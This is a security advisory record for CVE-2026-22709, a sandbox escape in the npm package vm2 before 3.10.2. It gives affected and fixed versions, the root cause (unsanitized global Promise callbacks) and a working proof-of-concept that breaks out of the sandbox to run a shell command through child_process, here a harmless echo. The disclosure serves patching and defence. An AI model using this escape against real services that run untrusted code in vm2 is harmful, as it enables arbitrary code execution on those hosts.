---
identifier: "CVE-2026-22709"
identifiers:
- "CVE-2026-22709"
- "GHSA-99p7-6v5w-7xg8"
package_slug: "npm/vm2"
title: "vm2 has a Sandbox Escape"
description: "In vm2 for version 3.10.0, `Promise.prototype.then` `Promise.prototype.catch`
  callback sanitization can be bypassed. This allows attackers to escape the sandbox
  and run arbitrary code.\n\n```js\nconst { VM } = require(\"vm2\");\n\nconst code
  = `\nconst error = new Error();\nerror.name = Symbol();\nconst f = async () => error.stack;\nconst
  promise = f();\npromise.catch(e => {\nconst Error = e.constructor;\nconst Function
  = Error.constructor;\nconst f = new Function(\n\"process.mainModule.require('child_process').execSync('echo
  HELLO WORLD!', { stdio: 'inherit' })\"\n);\nf();\n});\n`;\n\nnew VM().run(code);\n```\n\nIn
  lib/setup-sandbox.js, the callback function of `localPromise.prototype.then` is
  sanitized, but `globalPromise.prototype.then` is not sanitized. The return value
  of async functions is `globalPromise` object."
date: "2026-01-26"
pubdate: "2026-01-26"
affected_range: "<3.10.2"
fixed_versions:
- "3.10.2"
affected_versions: "All versions before 3.10.2"
not_impacted: "All versions starting from 3.10.2"
solution: "Upgrade to version 3.10.2 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2026-22709"
- "https://github.com/advisories/GHSA-99p7-6v5w-7xg8"
- "https://github.com/patriksimek/vm2/security/advisories/GHSA-99p7-6v5w-7xg8"
- "https://github.com/patriksimek/vm2/commit/4b009c2d4b1131c01810c1205e641d614c322a29"
- "https://github.com/patriksimek/vm2"
- "https://github.com/patriksimek/vm2/releases/tag/v3.10.2"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
uuid: "8cdabe18-d617-4265-b369-ed3d0014e695"
cwe_ids:
- "CWE-693"
- "CWE-913"
- "CWE-94"
- "CWE-937"
- "CWE-1035"
